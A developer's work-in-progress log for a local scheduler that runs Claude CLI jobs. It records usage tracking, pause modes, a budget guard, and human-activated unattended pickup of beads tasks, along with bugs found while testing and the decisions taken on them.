# WIP

## Open work — the whole list

Everything not yet done, newest concern first. Each links to the section holding the
detail; nothing is tracked anywhere else, so if it is not here it is not tracked.

**Open work now lives in beads, not here.** This repo adopted `bd` on 2026-07-26 and declared
itself to the scheduler in `.scheduler.json`. `bd ready` is the list; this file keeps the
reasoning a bead title cannot carry. The two must be updated together — bead for state, WIP.md
for evidence.

```
bd ready                      # what is actionable
bd ready --label unattended    # ...and what the scheduler may run by itself
```

Filed at adoption: the wind-down bug (now fixed, below), M5's epic and its three remaining
steps chained in order, the deferred M6, and the five smaller items this list used to carry in
prose. Registration stops at `pending` — activation is a human's Touch ID, so nothing here runs
unattended until you click.

- [x] **Wind-down is not graceful for a run with subagents** — fixed and verified 2026-07-26.
      → [Diagnosis](#-fixed-2026-07-26--wind-down-was-not-graceful-for-a-run-with-subagents)
- [x] **M5 steps 4–6** — routes, Sessions tab, live verification — **all shipped 2026-08-01**, epic closed → [M5](#v2--launchbox-session--usage-management)
- [ ] **M6 (deferred)** — full rename with migration; optional `node:sqlite`

## v1 — scheduling core: SHIPPED

Plan: `docs/plans/2026-07-17-claude-scheduler.md` · design: `docs/specs/2026-07-17-claude-scheduler-design.md`.
All 9 steps done (scaffold+paths, db, validate+preview, formatter, notify+runner, scheduler, API server, UI, install/uninstall+README+smoke). Since extended with the extension system (`extensions/`, `lib/extensions.js`) and keep-awake (`lib/awake.js`). Baseline: **53/53 tests pass**.

## v2 — LaunchBox: session & usage management

Design: `docs/specs/2026-07-25-launchbox-design.md`. Each milestone has its own plan under `docs/plans/`.

- [x] **M1 · usage foundation** — `2026-07-25-m1-usage-foundation.md` — **shipped, 78/78 tests pass.** Read-only: nothing in M1 can block a run or suppress a fire.
  - [x] 1 `lib/usage.js` monitor + `tests/usage.test.js` — **71/71 tests pass**. `fakeSpawn` now records `stdin`. Deviations from the plan, both deliberate: self-rescheduling `setTimeout` rather than `setInterval` (a fixed interval can't back off), and the served snapshot is decoupled from the recorded row — a failure is logged with empty windows while the last good reading keeps being served, marked `stale`, with a `checkedAt` added to the documented shape so the UI can distinguish data age from probe age. The probe must `settle` **before** killing the answered child: the kill makes it exit 143, and a `close` handler that wins the race discards a good reading.
  - [x] 2 db: `usage_snapshots` + `run_usage` (+ `cleanupAll`). `avgDeltaForJob` returns `{samples, median}` (median, not mean — one delta polluted by a concurrent run would dominate a small sample).
  - [x] 3 per-run usage delta — `createRunner({ usage })`, optional; baseline read from the cache at launch, after-sample probed at finish with `refresh({coalesce: false})` so it can't be handed a reading taken before the run ended. Emits `usage:<runId>`. **75/75 tests pass.**
  - [x] 4 settings: `usagePollSec` (60-3600), `usageShow`, `usageWarnPct` (1-99) — core block, validated on write, and a poll-interval change re-arms the monitor immediately.
  - [x] 5 API: `GET /api/usage` (pending shape before the first probe, never null), `POST /api/usage/refresh` (429 + current snapshot inside the floor), `GET /api/usage/history?limit=&okOnly=`. **78/78 tests pass.**
  - [x] 6 UI: `public/util.js` extracted (`$`/`$$`/`api`/`apiErr`/`esc`/`toast`/`relTime`/`fullTime`/`duration`), `public/usage.js` renders the strip from `buckets` (they carry severity/scope; `windows` is the fallback), Usage card in Settings, click on strip/chip forces a probe. Found and fixed a **pre-existing** bug: `.menu { display: flex }` outranks the UA rule for `[hidden]`, so the awake menu was permanently visible and my strip inherited the same flaw — now settled globally with `[hidden] { display: none !important }`.
  - [x] 7 tests — `tests/usage.test.js` + runner/api coverage. No test spawns the real `claude`.
  - [x] 8 manual verified 2026-07-24: raw probe read 5h 57 / week 67 / Fable 90 critical+active, and `/api/usage` plus the strip matched exactly. All three `usageShow` modes render with no layout shift (banner strip 30px in every data state, compact chip 24px, off nothing).
- [x] **M2 · usage-aware scheduling** — `2026-07-25-m2-usage-aware-scheduling.md` — **shipped, 110/110 tests pass.**
  - [x] `afterReset` schedule type (+ validate, preview, deterministic jitter). Jitter is FNV-1a over `jobId|window` yielding **continuous ms** in `[0, jitterMin]`, not whole minutes — finer spread for free. Entries are stored with `offsetMin`/`jitterMin` explicit (defaults 3/2) so what fires is readable from the row and a later default change can't move an existing job. `previewSchedule` now returns **`{next, unknown}`** (shape change, plumbed through `/api/schedule/preview`): an unresolved reset is a state to report, not an error. A new job's preview can't know its own jitter (no id to hash yet), so the form says "reset fires get a fixed spread of up to Nm once saved" rather than showing a time it won't fire at.
  - [x] budget guard via injectable `admit(job, trigger)` on `createRunner`. Order: manual → guard off → per-job `ignoreGuard` → fail-open → active warning/critical bucket → 5h reserve → weekly reserve → per-job `minHeadroomPct` (measured against the **tightest** window). Fail-open triggers on a missing/unavailable snapshot **or one older than 2× pollSec** — a reading that stale is a guess. Not re-judged in `drainQueue` (tested).
  - [x] `params.budget` had to be validated in **core** `validate.js`: `validateFields` drops unknown keys, so an extension-field route would have silently discarded the per-job override.
  - [x] burn-down planner (preview + confirm) — capped by the same reserve `admit` enforces, never past the reset, and it **says what it dropped** ("capped by the minimum gap: N affordable runs left unplanned") rather than silently truncating. Confirm materialises `once` entries and **enables a disabled job**, reporting which in the response.
  - [x] reset-aware keep-awake — `auto` also holds when a reset-anchored fire is within `awakeResetLeadMin` (default 20), *whether or not the scheduler managed to arm it*; that's the whole point, since an unarmed entry has no timer to hold for. Bounded by a 60s grace so a reset time frozen by a broken probe can't hold the Mac awake forever.
  - [x] manual verified 2026-07-25 by driving the live UI over CDP (not inferred from a DOM dump): reset-mode schedule row, save, settings round-trip, guard-state line flipping to "not enforcing" when the guard is turned off, and a burn-down plan previewed and confirmed into 6 one-shots. Two polish bugs found only by looking: the plan text leaked raw window keys and job-id prefixes, and in-form toggles inherited the Pause switch's amber (which reads as "warning" on what is the safe default) — both fixed and re-verified live.
  - **Live finding worth acting on:** with shipped defaults this account's scheduler is **fully stood down** — the Fable weekly bucket sits at 90% `critical` + `is_active`, so `pauseOnWarning` blocks *every* scheduled fire, including jobs that never touch Fable. Verified against the real probe, not a fixture. The fix is model-scoped routing (deferred to post-M3, needs the stdin control channel); until then the lever is `pauseOnWarning: 0` or a per-job `ignoreGuard`.
  - **PLAN_LEAD_MS is 5min, not 60s** — found by driving it: apply() refuses a plan whose first slot has passed (rather than silently dropping confirmed fires), so a 60s lead expired the plan while it was still on screen.
- [x] **M3 · pause modes** — `2026-07-25-m3-pause-modes.md` — **shipped, 139/139 tests pass, live verified.**
  - [x] **spike first (§3.3), and it changed the milestone.** All four questions answered against the real CLI 2.1.211 (~$0.06, `--model haiku`). Headline: **plain SIGINT on the current argv path is behaviourally identical to the `interrupt` control request** — in-flight tool call denied *before it runs*, final `result` emitted, session fully resumable with accurate history — and it exits **0** where the control channel exits **1**. So the stdin control channel buys nothing for stopping and is **deferred out of M3**, retiring the milestone's top risk (no change to how any claude job is invoked). Full measured table + the four answers are in §3.3 of the plan.
    - Also confirmed the hazard: with stdin held open the child **never exits** (alive 33s after `result`; 81s after an interrupt), exiting ~1s after `stdin.end()`. Any future control-channel work must close stdin on `result` and carry a watchdog.
    - The control channel's remaining value is `set_model` (the model-scoped routing M2's live finding calls for) and in-session `get_usage` — build it when that needs it.
  - [x] **The trap the spike exposed, and the core of the design:** a graceful stop *reports itself as a failure* — `subtype: error_during_execution`, `is_error: true`, and `error_during_execution` is indistinguishable from a real mid-run error. So `stopped` is derived **only from having asked**, exactly like `killed`/`timedOut`, never from the child's exit reporting. Ordering in `settle()` is killed → timedOut → stopRequested → exit code. The claude formatter takes a `stopping()` hook so an intentional stop isn't rendered as the error the CLI reports.
  - [x] graceful-stop ladder — **SIGINT → SIGTERM after `softGraceMs` (default 120s) → SIGKILL**. `runner.requestStop/requestStopAll/stopping/clearQueue`; idempotent (asking 3× sends one signal); every rung written to the log and recorded in `meta.stopRung`. `patchMeta` is shared with the output handler specifically so stop metadata **cannot clobber `sessionId`** — resumability is the whole point. Extension contract: `gracefulStop: 'signal' | false` (`false` → straight to SIGTERM); the `'control'` value slots in later without redesign.
  - [x] `pauseMode` state machine `off|hold|soft|hard` in `lib/pause.js`. Legacy `paused='1'` → **`hold`** (never promoted to something that stops more than it did); `paused` stays a written alias, true for any non-`off` mode. `hold` returns null from `gate()` for *every* trigger — the scheduler already dropped the fire, and manual/retry went through in v1. Timed pause reads as `off` once lapsed **even if the expiry timer never fired** (the Mac may have been asleep); `refresh()` is what writes the lapse back. Composed ahead of the budget guard: being paused outranks a headroom figure.
  - [x] new run status `stopped` — never retried, and `shouldNotify` already treated it correctly (false under `failure`, true under `always`), verified by test rather than assumed. `--stopped` is a deliberately cool teal, not a failure red.
  - [x] API/UI: `GET|PUT /api/pause`, `POST /api/runs/:id/stop`, `pause` on `/api/jobs` (banner rides the existing 2.5s tick, no second poller), `softGraceMs` setting, 4-way segmented header control with a hard-pause confirm, "stopping…" chip, and a soft-pause manual-run override (`{force:true}`) whose confirm is gated on the **exact** reason string — the budget guard's reasons also start with "paused", and offering to override the wrong one would misrepresent the click.
  - **Finding (behaviour, not a bug):** overlap-skip is judged *before* admission, so re-running a job whose previous run is still winding down reports "already running" with **no** `skipReason`, not the pause. Correct — it is still running — but it means a paused-and-draining job gives no pause reason. Pinned by a test.
  - [x] **live verified 2026-07-25 over CDP** — drove the real UI, not a DOM dump. Two `command` jobs made the ladder observable without spending tokens: `sleep 300` (honours SIGINT) and `trap "" INT; sleep 300` (ignores it, forcing escalation). Confirmed: wind-down → `stopped` with `stopRung: SIGINT`; the stubborn child escalating to SIGTERM after a 6s `softGraceMs` and **still recording `stopped`, not `fail`** (the log reads `⏹ paused (soft) — winding down at the next safe point (SIGINT)` then `⏹ still running after 6s — SIGTERM`); the "stopping…" chip with its rung in the tooltip while the ⤓ button correctly withdraws and ■ stays; hard-pause confirm **dismiss = genuine no-op** and accept cutting a winding-down run short as `killed` (kill outranks the wind-down); soft-pause manual override declined *and* accepted; `hold` allowing a manual run with **no** confirm (the v1 regression guard); the Stopped filter chip; `softGraceMs` round-tripping through Settings; and the banner clearing on unpause.
  - **Two real UI bugs found only by looking, both fixed and re-verified:**
    - **A pre-existing CSS specificity bug my new code inherited** — `button.icon` sets `color` at specificity 0,1,1, so bare `.run-btn`/`.stop-btn` (0,1,0) lost to it: **the run button's green and the kill button's red have never actually rendered in the lists**, and my `.soft-stop-btn` teal was dead on arrival too. All three now qualified as `button.icon.<name>`. Exactly the same trap as the M1 `[hidden]` bug — a class that looks like it wins but doesn't.
    - **`⏹` and `■` are indistinguishable at 12px**, so the two buttons that do very different things to your work looked identical. Wind-down is now `⤓`.
    - Also tightened the pause toast, which read "…wind down — 1 winding down"; extras now join with ` · `.
  - **Not a bug, checked because it looked like one:** a confirm dialog appeared to fire twice. Instrumented `window.confirm` and measured **one click → exactly one confirm**; the duplicate was Chrome queueing dialogs across automation calls.
- [x] **M4a · beads task sources** — `2026-07-25-m4a-beads-task-sources.md` — **shipped 2026-07-25, 251/251 tests pass, live verified end-to-end.** Projects declare tasks in beads; the scheduler polls `bd ready --json` per registered repo and mirrors nothing. Decisions settled with the user: poll not mirror; **no MCP** (registration is a property of a repo, not a conversation, and `bd` already files tasks); no completion callbacks (we run the work, so we close the bead); pin `bd`'s version behind a one-file adapter and revisit deliberately. Safety is **two independent gates**: an opt-in `autoLabel` per bead (never opt-out) *plus* human activation of a project — an agent may write `.scheduler.json` and file beads but must never activate. Concurrency: our own transactional `task_leases` is the lock, `bd update --claim` is only a notice board (beads has reported `--claim` races), and scheduled work runs in a **git worktree** so it can't collide with a live session's checkout.
  - **Spike, three items — all three answered; nothing left blocking `lib/beads.js`.** Pinned binary installed 2026-07-25: **`bd 1.1.0` (Homebrew, `brew pin`ned) + `dolt 2.2.2`**; Homebrew's 1.1.0 is also upstream's latest, so no pin-vs-latest tension. Two re-runnable assertion scripts, both green 2026-07-25 and both deliberately outside `npm test` (they shell out to the real `bd`): `docs/spikes/m4a-beads-worktree.sh` (items 1–2, 24/24) and `docs/spikes/m4a-beads-lock-contention.sh` (item 3, 33/33, ~2min because several conclusions require waiting out a held lock).
    - [x] **item 1 — `.beads` in a worktree: answered, and the premise was wrong.** `bd init` **commits** `.beads/` (config, metadata, hooks) and gitignores only `embeddeddolt/` — the actual 2.1MB Dolt DB. So a worktree gets a **hollow `.beads/`**: present, plausible, dataless. That's worse than absent, because `existsSync('.beads')` passes and tells you nothing. bd *does* resolve across the boundary by itself — from a sibling **or** nested worktree, `bd where --json` reports the primary's paths and claims/closes land in the primary DB — and **git is the bridge** (proved by falsification: delete the worktree's `.git` file and `database_path` vanishes, `bd ready` exits 1). **Decision: don't lean on that implicit resolution** — pass `BEADS_DIR`/`-C` explicitly (verified to work with no git at all), because the implicit path is undocumented behaviour in a fast-moving CLI whose failure mode is a silent hollow dir. `projects.beadsDir` survives as a stored column, populated from `bd where --json`, never concatenated. `healthy()` = `bd where --json` with a present `database_path`. Two extras: **`worktreeRoot` must sit outside the repo** (a nested worktree litters the human's `git status` with `?? .worktrees/`), and **polling is git-silent** (clean baseline + reads + claim + 6 writes → both checkouts still clean) — ⚠️ **but only for reads and `--claim`; this item never ran a `close`, which does dirty a tracked file (see item 3's tail)**. Also: `bd init` is invasive — it wrote and auto-committed `AGENTS.md`, `CLAUDE.md`, `.claude/`, `.codex/`, `.agents/`.
    - [x] **item 2 — `ready --json` schema, captured as a by-product.** Bare array (no envelope), `[]` when empty, rc 0 on empty / 1 on failure. `issue_type` not `type`; `priority` is an int. **Two traps found only by looking:** an unlabelled bead **omits the `labels` key entirely** (not `[]`, not `null`), so a naive `b.labels.includes(autoLabel)` throws on the first one; and **`bd show --json` returns a one-element array**, not an object. No `assignee` in `ready`, so the pre-launch re-read must use `bd show`. `ready` excludes `in_progress`, so a landed `--claim` also drops the bead from later polls — belt-and-braces, but it does not demote our lease. `ready --explain --json` is a *different* top-level shape (envelope with `ready`/`blocked`/`summary`/`schema_version`). **stderr carries warnings on success**, so failure must key off the exit code only; set `BD_NON_INTERACTIVE=1` on every daemon call.
    - [x] **item 3 — lock contention: it blocks, silently and without limit. The expected design was wrong.** Backend is embedded (`Mode: direct`), and embedded mode has **no `bd sql`** escape hatch, so the CLI is the only interface. Under a held DB a claim **waits out the entire hold and then succeeds** — 104s for a 100s hold, `rc=0`, **empty stderr**, no corruption. So **there is no retry policy to write, because there is no error to retry**: the only protection is a **client-side timeout we impose**, and the hazard is a wedged daemon rather than a loud failure. **Every DB-touching command blocks, including `healthy()`** (`ready`/`where`/`show`/`close` all wait; only `bd --version` is immune at ~200ms, so the boot version check can't hang). Measuring this needed one fresh lock-holder *per command* — a blocking read eats the holder's lifetime and masks the next command, which is exactly how an earlier probe of mine concluded "reads don't block". **A timeout is safe:** killing a blocked claim leaves the bead `open` under both SIGTERM and SIGKILL — no phantom write lands later — so a timed-out claim is *definitely did not happen* and is retryable next poll. **`--claim` is genuinely compare-and-set** (8 concurrent claims → exactly 1 winner; losers exit rc=1 naming the winner), which upgrades it to a real back-stop that logs *who* won, but does **not** make it our lock: the lease still owns the pre-claim window. Also: `update --claim --json` is a one-element array with `assignee`+`started_at`; and `--dolt-auto-commit`'s help says `Default: off` while a `bd init`-ed repo reports **`on`** — the spike asserts the effective value rather than trusting the docs.
    - [x] **item 3's sting in the tail — `bd close` dirties the human's checkout, and item 1's "git-silent" claim was over-broad.** `bd close` appends one line to the **git-tracked** `.beads/interactions.jsonl` (3/3 reproducible), leaving ` M .beads/interactions.jsonl` in the working tree. **It cannot be suppressed** — neither `BD_NO_AUDIT=1` nor `audit.enabled=false` has any effect and there's no config key; `bd audit --help` says the file is "intended to be versioned in git". **The worktree doesn't shield the primary**: the file follows the *resolved beads dir*, so a close run from the worktree still dirties the **primary** while leaving the worktree clean. Item 1's git-silence result stands only for reads and `--claim` — it never exercised a close. So the "we never touch your checkout" promise needs one honest asterisk; leaning to leave the line (it's meant to be committed) **and** surface it in the Projects tab as expected noise, rather than committing on the human's behalf or quietly hoping they don't notice.
  - **Engine built 2026-07-25 (steps 1–3 of 4), 67 new tests, 206/206 green.** `lib/db.js` gained `projects` + `task_leases` (pure additions, no migration) with an **atomic** `acquireLease` — the upsert's `WHERE state != 'held'` is what makes two poll cycles unable to take one bead, verified by a mutation check (forcing it to return true fails 10 tests). `lib/beads.js` is the sole thing that knows `bd` exists: every DB-touching call carries a hard timeout (the spike's headline — contention hangs rather than errors), success keys off the exit code only, `labels ?? []`, `issue_type`→`type`, `show`/`--claim --json` unwrap `[0]`, and a lost claim reports the winner's name. `lib/worktree.js` does create/reuse/reap with `git worktree list` as the authority (a pruned leftover directory must not look live). `lib/projects.js` is the poller: discovery writes **`pending` only** and re-discovery refreshes the declaration without ever un-pausing, `autoLabel` absence is an error not a default-to-all, lease→re-read→claim→launch in that order, and the outcome contract is that **only `ok` closes the bead** — `fail`/`killed`/`stopped`/guard-`skipped` all release the lease for retry, since an M3 wind-down is not a task failure. Busy ≠ broken: a timeout increments a streak counter and never latches `error`, while a real `bd` failure marks the project and the loop still visits every other project.
  - **§4a.7 cost attribution — RESOLVED, and it needed no new table.** The problem only existed because the materialised job was assumed to be *reaped*. It isn't: one job row per bead, reused every run (`findJobByBead` on `json_extract(params,'$._beadId')`), so `run_usage`'s existing `jobId` key makes `avgDeltaForJob` accumulate that bead's real cost for free. Costs a few hundred bytes per bead and gives the user a visible per-bead run history; reaping becomes an optional pruning policy instead of something on the hot path.
  - [x] **step 4 — API + Projects tab, shipped 2026-07-25. 239/239 tests pass, live verified end-to-end against real `bd 1.1.0`.** Routes: `GET/POST /api/projects`, `PUT /api/projects/:id` (the airlock — `active`/`paused` **only**; `pending` belongs to discovery and `error` to the poller, so both are rejected), `DELETE` (409 + the bead ids while a lease is held, `{force:true}` to override), `POST /api/projects/discover`, `GET /api/projects/:id/ready` (live passthrough, works on a `pending` project so you can see what *would* run before activating), `POST /api/projects/:id/poll`. Settings gained `projectRoots`/`beadsPollSec`/`bdPath`/`worktreeRoot`; the poller starts at boot and `releaseOrphanLeases()` runs beside `failOrphanRuns()`.
    - `GET /api/projects` costs **zero** `bd` calls — a per-row health probe would mean one blockable call per project per render, so the row is served from the poller's cache plus `projects.explain()`. Only the explicit Ready…/Poll buttons touch the database.
    - Decision (b) is discharged as a permanent, unhidden note in the tab — and **the note had to be broadened**, see the audit-line finding below.
    - `worktreeRoot` is rejected if it sits inside a registered repo (the spike's measured "nested worktree litters `git status`" trap), and `projectRoots`/`worktreeRoot` are stored `~`-expanded and absolute: discovery hands roots straight to `readdir` and treats an absent root as "not an error", so an unexpanded `~/dev` would have failed **silently** — and `~/dev` is exactly what the field suggests.
  - **Six real bugs found by driving it, five of which no test would have caught.** The engine was 206/206 green and complete; every one of these came from watching it work on a real repo.
    - **1. A claimed-but-not-run bead was silently lost forever.** `bd ready` excludes `in_progress`. Our `--claim` sets exactly that, so every path that gave up *after* the claim — guard skip, worktree failure, runner decline, and above all a `fail`/`killed`/`stopped` run — released our lease "for retry" while leaving the bead invisible to every future poll. The outcome contract's "leaves the task open for retry" **guaranteed never**. Caught by watching the budget guard skip a run and then finding the bead `in_progress` and gone from `bd ready`; reproduced again unprompted by the still-running old daemon. Fixed with `beads.release()` (`bd update <id> --status open --assignee ""` — measured: restores it to `ready` in one call, rc 0) called from a `handBack` path that is deliberately **separate from `abandon`**, so the pre-claim paths — above all "someone else claimed it" — cannot reach it and un-claim a human's bead. A failed un-claim is logged loudly with the exact command to fix it, because a stuck bead is otherwise invisible. Mutation-checked: making the un-claim a no-op fails 4 tests.
    - **2. `ok` did not mean "done", and the tracker filled with work nobody did.** The first real run **could not write a single file** (unattended `claude -p` defaults to asking, and with no TTY the tool call is denied), said so in plain English, exited `subtype: success` / code 0 — and the scheduler **closed the bead**. `success` means "the model stopped talking without erroring", not "the task happened". **Decided with the user: require an explicit marker.** The prompt now asks the agent to end with `TASK-COMPLETE: <beadId>` (the id is in the marker so a stray one cannot close the wrong task) and states the consequence of omitting it; a run that exits ok without it is handed back and **the agent's own closing words are attached to the bead as a `bd note`**, so a retry is never a mystery. The final message is persisted by the claude formatter as `meta.resultText` (tail-truncated — a closing statement lives at the end).
    - **3. Scheduled beads could not edit anything.** `materialise()` builds its job row with `createJob` directly rather than through `validateJob`, so the claude extension's own `permMode` field default never applied and every bead ran in "ask" mode. **Decided with the user:** a repo may declare `defaults.permMode` in its own committed `.scheduler.json`, up to and including `auto`. Absence still means the fail-closed `default`, and an **unrecognised value is an error, not a silent downgrade** — a typo must not quietly widen what unattended work may do.
    - **4. A `hold` pause did not stop bead pickup.** The poller launches runs *directly*, not through the scheduler, and `pause.gate()` deliberately admits everything under `hold` (in v1 the only things reaching the runner were a manual click and an armed retry). So the button whose entire promise is "nothing fires automatically" left the most unattended work in the system running. The poller now consults `pause.blocksSchedule()` itself — checked **after** the `ready` read, because a pause stops launching, not looking, and the tab should still report an honest ready count.
    - **5. An ordinary restart stranded whatever was in flight** — the same bug as #1, one level up. `releaseOrphanLeases()` frees the leases a dead daemon left, but the beads are still `in_progress` from our claim, so a crash *or a routine restart* mid-run hid exactly the work it was doing. Now `projects.recoverOrphans()` runs **before** the leases are released (while they still say which beads were ours), re-reads each bead, and hands it back **only if our actor still holds it** — if the claim never landed and a human has since taken it, taking it off them would be worse than leaving a stale one. A bead it cannot re-read is reported rather than guessed at. Not awaited before `listen()`: it makes `bd` calls that can block on a busy database, and the UI should come up anyway. Live-verified by stranding a bead by hand and restarting: `[]` → recovered into `bd ready`.
    - **6. Two "contributing nothing was silent" holes.** A poll reporting `1 ready · started 0` gave **no reason at all**; `pollProject` now returns a per-bead `skipped[]` with reasons, and stops after the first *guard* refusal (a judgement about the machine, not the bead — trying the rest would claim and hand back every ready bead on every poll, real churn in the human's audit log for a guaranteed no). And activating a repo `bd` cannot read left a row looking `active` and healthy for up to a poll interval; `refreshHealth` now records `lastError` immediately, without touching `state` (a probe is not a verdict).
  - **The audit-line promise was understated, and is now measured per operation.** Item 1's "polling is git-silent" holds — `ready` and `--claim` append **0** lines — but a **close appends 1** and **handing a bead back appends 2** (one per changed field). The tab's note says exactly that rather than "one line per completed task". Also fixed: `bd` reports some failures on **stdout** as a JSON envelope (`{error, message, hint}`), so `must()` was rendering `failed (exit 1): no stderr` while the real explanation went unread — errors now use bd's own `message` + `hint`.
  - **`BEADS_ACTOR=claude-scheduler` on every call.** Without it bd falls back to the *repo's* `git user.name`, so scheduler claims appeared under the human's own name — which defeats the whole point of the claim as a notice board ("taken" — by whom?) and made our audit entries indistinguishable from theirs.
  - **`readyCount` is persisted** (a column plus an in-place `ALTER TABLE` in `migrate()`, verified to apply to an existing database): `lastPollAt` persists, so an in-memory-only count made a restarted daemon pair "polled 40s ago" with "ready unknown", which reads as a fault rather than as "this process hasn't looked yet".
  - **Live end-to-end, verified 2026-07-25 by driving the real UI over CDP** (not inferred from tests or a DOM dump), against a throwaway `bd init`-ed fixture with four beads — one ready+labelled, one labelled but **blocked** by an open dependency, one unlabelled, one blocker. Confirmed: discovery found the two declared repos and ignored the third, writing `pending` only; the missing-`autoLabel` repo stated why it can never contribute; Ready… showed **exactly** the one eligible bead (blocked and unlabelled correctly withheld by real `bd`); the activate confirm **dismissed is a genuine no-op**; activation recorded the real `bd` version and learned `beadsDir` from `bd where`; the budget guard skipped a fire and named its reason, handing the bead back; and with the guard allowed through, the bead **ran, wrote its file in the worktree, emitted the marker, and was closed by `claude-scheduler`** — with the primary checkout dirty in exactly one file, `.beads/interactions.jsonl`, as promised. One job row served 6 runs of that bead, so §4a.7's learned cost accumulates as designed.
  - **Adversarial review of the diff found nine more, all fixed — 251/251 tests pass.** Worth recording because the pattern is consistent: everything live-driving caught was a *wrong outcome*, and almost everything review caught was a **race or a lost update** — invisible in a single-threaded test and invisible when you drive the UI by hand.
    - **A poll wrote back a `state` captured before its `await`s, so a Pause landing mid-poll was silently undone** — and since `error` is a polled state, a failing poll stamped `error` over the human's `paused` and the next poll promoted it back to `active`, launching everything. That is the activation airlock *and* the pause defeated by a stale write. All eight poll writes now go through `recordPoll`, which re-reads the row and only ever **transitions** state, never echoes it. Mutation-checked.
    - **`releaseOrphanLeases()` ran unawaited *after* `projects.start()`** — and it is a blanket `WHERE state = 'held'`, so it freed leases the first poll had just acquired. With an advisory claim that had failed, the same bead was then offered again and could run **twice**, which is the one thing the lease exists to prevent. `recoverOrphans()` now captures the orphan list and releases exactly those keys **synchronously, before the interval is armed**, doing only the slow `bd` un-claiming in the background. Mutation-checked. `releaseOrphanLeases` keeps a ⚠️ comment saying it is only safe before the poller starts.
    - **The pause was checked once per poll, not between beads** — each bead costs a `bd show` plus a `--claim`, so with several ready beads a human hitting Hold partway through watched the rest launch anyway. (`soft`/`hard` were caught downstream by the runner's gate; `hold` deliberately admits everything there, so the one mode promising "nothing fires automatically" was the one that needed it.)
    - **`TASK-COMPLETE: sp-12` closed `sp-1`.** The marker check was a substring test, and bd ids are short suffixes, so prefix pairs are routine — the wrong-id copy/paste that putting the id in the marker is *meant* to catch was the exact case that slipped through. Now anchored.
    - **A failed `bd close` stranded a finished bead.** Deliberately still not handed back (a retry would redo completed work), but it stays `in_progress` and therefore invisible to `bd ready`, so it is the one outcome the scheduler cannot repair itself — now logged at error level with the exact `bd close` command, matching how a failed un-claim is treated.
    - **A timed-out `bd --version` latched every project into `error`** — the one `catch` that forgot to check `err.busy`, so a busy database reported as broken.
    - **`get()`'s not-found regex matched neither stream on bd 1.1.0**, making `if (!fresh) abandon('bead no longer exists')` dead code. Measured: stdout says `no issues found matching the provided IDs`, stderr says `no issue found matching "<id>"`. Both are checked now.
    - **`recoverOrphans` un-claimed a bead with a null assignee.** Our claim always sets one, so `in_progress` with none means a human moved it by hand — flipping their work back to `open` is precisely the rule "never un-claim a claim we did not place", broken. Now strictly `assignee === BD_ACTOR`.
    - **A run could finish before `onDone` subscribed.** `runner.start` returns synchronously and a spawn that throws is failed *inside* that call, so `once('done:…')` attached after the emit and never fired — lease held and bead `in_progress` forever, with no symptom. A terminal status is now handled inline.
    - **The settings PUT applied partially**: `beadsPollSec` was persisted before the `worktreeRoot` check could reject the save, so the new interval was stored but the poller never re-armed. And because the form submits all four fields every time and the check ran against *currently registered* projects, registering a repo containing the existing `worktreeRoot` made **every** settings save fail — usage, pause, budget and all — with an error about worktrees. Validation now precedes every write, and an already-stored value is grandfathered.
    - **A hand-registered repo's `.scheduler.json` could never be re-read**, so an `autoLabel` typo was permanent (only `discover()` re-read the file, and discovery only walks `projectRoots`). `pollProject` now re-reads the declaration from disk each poll — the repo owns that file, so it, not our snapshot, is the source of truth — falling back to the stored copy if it has gone missing.
    - **One worktree per project meant `maxConcurrent > 1` corrupted it**: two beads from the same project shared a checkout and a branch and edited each other's files — the collision the worktree exists to prevent, between two of *our* runs. Effective concurrency is clamped to 1 whenever a worktree is in use, and the poll says so rather than silently ignoring the config.
    - Also: the bead prompt now says `bd -C <primary> show <id>`, because the spawned child does **not** inherit `BEADS_DIR` and its cwd is a worktree with a hollow `.beads/` — so the very first instruction could have failed; and the bead note keeps the **tail** of the agent's closing message, matching the formatter, since truncating from the front drops the sentence explaining what went wrong.
  - **Re-verified live after all fixes:** the loop still runs end-to-end (bead claimed → ran → wrote its file in the worktree → closed), and the config re-read picked `permMode` straight off disk without a re-discovery.
  - **Known wart, not a bug:** the list re-renders wholesale every 5s (same pattern as the jobs list), so a click can land on a node that was just replaced. Harmless in hand use; it made CDP automation need `evaluate_script` rather than `click`.
  - **Deferred deliberately:** `bd ready --explain` (the "why is this blocked" list). The spike captured its envelope shape, but it is a *different* top-level shape and adding it now would mean a new adapter method without its own coverage. The ready list shows dependency counts instead.
  - User-facing explainer written machine-wide: `~/.claude/docs/beads-task-tracking.md`, pointed to from `~/.claude/CLAUDE.md`, so every project on this machine can see the convention and opt in.
  - [x] **Machine-wide docs brought up to date 2026-07-25** (they were the last stale thing left saying pickup was designed-not-built). Both now describe it as **built but activation-gated** — the accurate claim needs all three of a committed `.scheduler.json`, a bead carrying the repo's `autoLabel`, and a human-activated project, so an agent can't tell the user work "will run automatically" just because it filed a bead. Added: the `TASK-COMPLETE: <beadId>` contract with its consequences (no marker → handed back with the closing message attached as a `bd note`; the id is anchored, so `sp-12` can't close `sp-1`) written for agents in *any* repo, since a bead filed today may be run unattended later; `defaults.permMode` in the config example with the fail-closed rationale; the config being re-read every poll; `BEADS_ACTOR=claude-scheduler`; the worktree concurrency clamp; and the audit-line cost **measured per operation** as a table (reads/`--claim` 0, `close` 1, hand-back **2** — one line per changed field), replacing the understated "one line per completed task".
- [x] **M4 · budget bursts over ready beads** — **shipped 2026-07-25, 280/280 tests pass, live verified over CDP.** Plan rewritten first as `2026-07-25-m4-bursts.md` (the old `m4-backlog-bursts.md` is deleted, not annotated: it was written before M4a and assumed the scheduler owned a task pool). Auditing it against shipped code changed the milestone in two structural ways and turned up two pre-existing bugs.
  - **The measured live ceiling survives untouched** and is still the whole point: the estimate only sizes the timetable, the measured delta is what enforces. `backlog_tasks` is dead (the mirror M4a rejected); `bursts` survives with `projectIds`/`slots`/`reason` added. No new cost table — per-bead cost already rides `run_usage` because one job row per bead is reused every run.
  - **The old §4.3 execution model had to be inverted, and would have been a real bug.** It said each task materialises a `jobs` row with a `once` entry, buying "the M2 guard and M3 pause for free". Both halves are now false: a cron-fired bead run bypasses the lease, the pre-launch re-read, `--claim`, `handBack` and the marker check — so it could neither close its bead nor hand it back, and it would **race the poller for the same bead**, the one thing the lease exists to prevent. ("Pause for free" is also false off the scheduler path, since `hold` deliberately admits everything reaching the runner.) So **the burst owns timing and admission; `lib/projects.js` owns bead mechanics** and remains the only thing that launches a bead.
